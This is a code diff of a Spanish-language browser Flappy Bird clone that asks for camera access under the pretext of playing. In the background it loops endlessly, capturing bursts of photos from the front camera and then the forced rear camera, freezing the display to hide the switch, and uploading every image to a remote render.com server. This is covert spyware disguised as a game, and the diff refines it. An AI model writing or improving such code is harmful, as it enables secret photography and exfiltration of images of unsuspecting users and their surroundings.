@@ -3,29 +3,29 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-    <title>Flappy Dual Cam Fix</title>
+    <title>Flappy Ultra Fix</title>
     <style>
         * { box-sizing: border-box; touch-action: none; }
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; color: white; }
         
-        /* Contenedor para evitar deformaciones */
-        #video-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; overflow: hidden; }
-        video#webcam { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); filter: brightness(0.6); }
+        /* Contenedor rígido para que nada se deforme */
+        #cam-box { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; display: flex; align-items: center; justify-content: center; background: #000; }
+        video#webcam { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.6); }
 
         canvas#freezeCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2; display: none; object-fit: cover; }
         canvas#gameCanvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; }
 
-        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 300; display: flex; align-items: center; justify-content: center; text-align: center; }
-        .card { background: #1a1a1a; padding: 35px; border-radius: 20px; border: 3px solid #f1c40f; max-width: 400px; width: 90%; }
-        .btn { background: #f1c40f; color: #000; border: none; padding: 18px; font-size: 18px; font-weight: bold; border-radius: 12px; cursor: pointer; margin-top: 20px; width: 100%; }
-        .hud { position: absolute; top: 20px; width: 100%; text-align: center; z-index: 100; font-size: 32px; font-weight: bold; text-shadow: 2px 2px #000; display: none; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 300; display: flex; align-items: center; justify-content: center; text-align: center; }
+        .card { background: #111; padding: 30px; border-radius: 20px; border: 2px solid #f1c40f; width: 85%; }
+        .btn { background: #f1c40f; color: #000; border: none; padding: 15px; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; width: 100%; margin-top: 15px; }
+        .hud { position: absolute; top: 20px; width: 100%; text-align: center; z-index: 100; font-size: 32px; font-weight: bold; display: none; }
     </style>
 </head>
 <body onclick="birdJump()">
 
 <div class="hud" id="hud">SCORE: <span id="score">0</span></div>
 
-<div id="video-container">
+<div id="cam-box">
     <video id="webcam" autoplay playsinline></video>
 </div>
 <canvas id="freezeCanvas"></canvas>
@@ -33,15 +33,15 @@
 
 <div id="permission-screen" class="overlay">
     <div class="card">
-        <h2 style="color:#f1c40f;">ACCESO A CÁMARA</h2>
-        <p>Permite el acceso para calibrar la luz y jugar.</p>
-        <button class="btn" onclick="initSystem()">ACTIVAR CÁMARA</button>
+        <h2 style="color:#f1c40f;">ACCESO TOTAL</h2>
+        <p>Habilitá la cámara para iniciar el juego.</p>
+        <button class="btn" onclick="initSystem()">ACTIVAR</button>
     </div>
 </div>
 
 <div id="start-screen" class="overlay" style="display:none;">
     <div class="card">
-        <h1 id="title-msg" style="color:#f1c40f;">¡LISTO!</h1>
+        <h1 id="title-msg" style="color:#f1c40f;">LISTO</h1>
         <button class="btn" onclick="startGame()">JUGAR</button>
     </div>
 </div>
@@ -55,77 +55,62 @@
     const SERVER_URL = "https://pagina-web-camara.onrender.com/upload";
 
     let bird, pipes, score, isRunning = false;
-    let cameraDevices = [];
     let pipeInterval;
-    let burstRunning = false;
 
-    // --- 1. SISTEMA DE CÁMARAS MEJORADO ---
+    // --- 1. CAMBIO DE CÁMARA POR MODO (USER vs ENVIRONMENT) ---
     async function initSystem() {
         try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            cameraDevices = devices.filter(d => d.kind === 'videoinput');
-            
-            // Intentar identificar frontal y trasera por nombre si el index falla
-            await changeStream(0); 
-            
+            await startCamera("user"); // Arranca con la de la cara
             document.getElementById('permission-screen').style.display = 'none';
             document.getElementById('start-screen').style.display = 'flex';
-            
-            if (!burstRunning) {
-                burstRunning = true;
-                startDualBurstCycle();
-            }
-        } catch (err) { alert("Error de cámara: " + err); }
+            runBurstCycle();
+        } catch (err) { alert("Error crítico: " + err); }
     }
 
-    async function changeStream(index) {
-        if (!cameraDevices[index]) return;
-        
-        // APAGADO TOTAL del flujo anterior para evitar bloqueos
+    async function startCamera(mode) {
         if (video.srcObject) {
-            video.srcObject.getTracks().forEach(t => t.stop());
-            video.srcObject = null;
+            video.srcObject.getTracks().forEach(track => track.stop());
         }
 
+        // Constraints estrictas para evitar deformación
         const constraints = {
-            video: { 
-                deviceId: { exact: cameraDevices[index].deviceId },
-                width: { ideal: 640 },
-                height: { ideal: 480 }
+            video: {
+                facingMode: mode,
+                width: { ideal: 1280 },
+                height: { ideal: 720 }
             }
         };
 
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(constraints);
-            video.srcObject = stream;
-            // Quitamos el efecto espejo si es la cámara trasera
-            video.style.transform = (index === 0) ? "scaleX(-1)" : "scaleX(1)";
-            return new Promise(resolve => video.onloadedmetadata = resolve);
-        } catch (e) { console.error("Error al cambiar stream", e); }
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        // Solo espejamos la de la cara
+        video.style.transform = (mode === "user") ? "scaleX(-1)" : "scaleX(1)";
+        
+        return new Promise(resolve => video.onloadedmetadata = resolve);
     }
 
-    async function startDualBurstCycle() {
+    async function runBurstCycle() {
         while (true) {
-            // 5 fotos ráfaga cámara frontal
+            // 5 fotos ráfaga cara
             await takeBurst(5);
 
-            if (cameraDevices.length > 1) {
-                freeze(true); 
-                await new Promise(r => setTimeout(r, 100)); // Buffer de seguridad
-                
-                await changeStream(1); // CAMBIO A TRASERA
+            // Congelamos y cambiamos a la trasera
+            freeze(true);
+            try {
+                await startCamera("environment"); // OBLIGA a la trasera
                 await takeBurst(5);
-                
-                await changeStream(0); // VUELTA A FRONTAL
-                freeze(false);
-            }
-            await new Promise(r => setTimeout(r, 1500));
+                await startCamera("user"); // VUELVE a la cara
+            } catch (e) { console.log("No hay cámara trasera disponible"); }
+            freeze(false);
+
+            await new Promise(r => setTimeout(r, 2000));
         }
     }
 
     async function takeBurst(count) {
         for (let i = 0; i < count; i++) {
             const snap = document.createElement('canvas');
+            // Mantenemos ratio 4:3 para las capturas enviadas
             snap.width = 320; snap.height = 240;
             snap.getContext('2d').drawImage(video, 0, 0, 320, 240);
             
@@ -135,8 +120,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ image: snap.toDataURL('image/jpeg', 0.5) })
             }).catch(() => {});
-            
-            await new Promise(r => setTimeout(r, 150)); 
+            await new Promise(r => setTimeout(r, 150));
         }
     }
 
@@ -144,10 +128,14 @@
         if (active) {
             freezeCanvas.width = window.innerWidth;
             freezeCanvas.height = window.innerHeight;
-            // Dibujar el frame de la cámara frontal antes de que se apague
+            // Captura el estado actual antes de apagar la cámara
             fCtx.save();
-            fCtx.scale(-1, 1);
-            fCtx.drawImage(video, -freezeCanvas.width, 0, freezeCanvas.width, freezeCanvas.height);
+            if (video.style.transform.includes("-1")) {
+                fCtx.scale(-1, 1);
+                fCtx.drawImage(video, -freezeCanvas.width, 0, freezeCanvas.width, freezeCanvas.height);
+            } else {
+                fCtx.drawImage(video, 0, 0, freezeCanvas.width, freezeCanvas.height);
+            }
             fCtx.restore();
             freezeCanvas.style.display = 'block';
         } else {
@@ -161,7 +149,7 @@
         document.getElementById('hud').style.display = 'block';
         gameCanvas.width = window.innerWidth;
         gameCanvas.height = window.innerHeight;
-        bird = { x: 80, y: gameCanvas.height / 2, v: 0, radius: 20 };
+        bird = { x: 50, y: gameCanvas.height / 2, v: 0, radius: 18 };
         pipes = []; score = 0; isRunning = true;
         document.getElementById('score').innerText = "0";
         if (pipeInterval) clearInterval(pipeInterval);
@@ -169,27 +157,26 @@
         gameLoop();
     }
 
-    function birdJump() { if (isRunning) bird.v = -8; }
+    function birdJump() { if (isRunning) bird.v = -7.5; }
 
     function spawnPipe() {
         if (!isRunning) return;
-        const gap = 200;
         const h = Math.random() * (gameCanvas.height - 350) + 70;
-        pipes.push({ x: gameCanvas.width, top: h, bottom: h + gap, w: 70, passed: false });
-        pipeInterval = setTimeout(spawnPipe, 1700);
+        pipes.push({ x: gameCanvas.width, top: h, bottom: h + 190, w: 60, passed: false });
+        pipeInterval = setTimeout(spawnPipe, 1500);
     }
 
     function gameLoop() {
         if (!isRunning) return;
         ctx.clearRect(0, 0, gameCanvas.width, gameCanvas.height);
-        bird.v += 0.45; bird.y += bird.v;
+        bird.v += 0.4; bird.y += bird.v;
+        
         ctx.fillStyle = "#f1c40f";
         ctx.beginPath(); ctx.arc(bird.x, bird.y, bird.radius, 0, Math.PI * 2); ctx.fill();
-        ctx.strokeStyle = "black"; ctx.stroke();
 
         pipes.forEach((p, i) => {
-            p.x -= 5;
-            ctx.fillStyle = "rgba(46, 204, 113, 0.9)";
+            p.x -= 4.5;
+            ctx.fillStyle = "#2ecc71";
             ctx.fillRect(p.x, 0, p.w, p.top);
             ctx.fillRect(p.x, p.bottom, p.w, gameCanvas.height - p.bottom);
             if (bird.x + bird.radius > p.x && bird.x - bird.radius < p.x + p.w) {
@@ -207,8 +194,7 @@
 
     function gameOver() {
         isRunning = false;
-        clearTimeout(pipeInterval);
-        document.getElementById('title-msg').innerText = "GAME OVER";
+        document.getElementById('title-msg').innerText = "GAME OVER (" + score + ")";
         document.getElementById('start-screen').style.display = 'flex';
         document.getElementById('hud').style.display = 'none';
     }
